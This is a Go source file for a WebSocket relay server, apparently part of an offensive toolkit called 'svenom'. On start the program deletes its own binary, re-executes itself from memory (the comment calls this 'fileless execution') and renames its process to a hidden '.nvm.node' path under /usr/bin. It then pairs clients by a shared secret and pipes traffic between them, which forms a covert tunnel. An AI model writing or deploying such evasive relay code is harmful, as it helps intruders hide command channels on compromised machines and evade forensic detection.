package main

import (
	"flag"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"

	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
	"github.com/gorilla/websocket"
)

var (
	listenAddr = flag.String("listen", "127.0.0.1:9443", "Address to listen")
	relayMode  = flag.Bool("relay", false, "Run as relay server")
	wsPath     = flag.String("ws-path", "/ws", "WebSocket endpoint path")
)

var wsUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

var waitingPeers = struct {
	sync.Mutex
	m map[string]chan *websocket.Conn
}{m: make(map[string]chan *websocket.Conn)}

func main() {
	flag.Parse()

	if !*relayMode {
		log.Fatal("Use -relay flag to start relay server")
	}

	// Fileless execution
	self, err := os.ReadFile(os.Args[0])
	if err == nil {
		os.Remove(os.Args[0])
		if err := memfd.ExecuteInMemory(self, os.Args, os.Environ()); err != nil {
			log.Printf("memfd fallback: %v", err)
		} else {
			return
		}
	}

	masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -listen "+*listenAddr)

	mux := http.NewServeMux()
	mux.HandleFunc(*wsPath, handleWS)

	log.Printf("WebSocket relay listening on %s%s", *listenAddr, *wsPath)

	if err := http.ListenAndServe(*listenAddr, mux); err != nil {
		log.Fatalf("Listen: %v", err)
	}
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	ws, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}

	// Baca secret sebagai first message
	_, msg, err := ws.ReadMessage()
	if err != nil {
		ws.Close()
		return
	}
	secret := strings.TrimSpace(string(msg))

	waitingPeers.Lock()
	if ch, ok := waitingPeers.m[secret]; ok {
		delete(waitingPeers.m, secret)
		waitingPeers.Unlock()
		log.Printf("Paired: %s...", secret[:8])
		ch <- ws
		return
	}

	ch := make(chan *websocket.Conn, 1)
	waitingPeers.m[secret] = ch
	waitingPeers.Unlock()
	log.Printf("Waiting for peer: %s...", secret[:8])

	peerWS := <-ch

	wsPipe(ws, peerWS)
}

func wsPipe(ws1, ws2 *websocket.Conn) {
	errCh := make(chan error, 2)

	copyWS := func(dst, src *websocket.Conn) {
		for {
			mt, msg, err := src.ReadMessage()
			if err != nil {
				errCh <- err
				return
			}
			if err := dst.WriteMessage(mt, msg); err != nil {
				errCh <- err
				return
			}
		}
	}

	go copyWS(ws1, ws2)
	go copyWS(ws2, ws1)

	<-errCh
	ws1.Close()
	ws2.Close()
}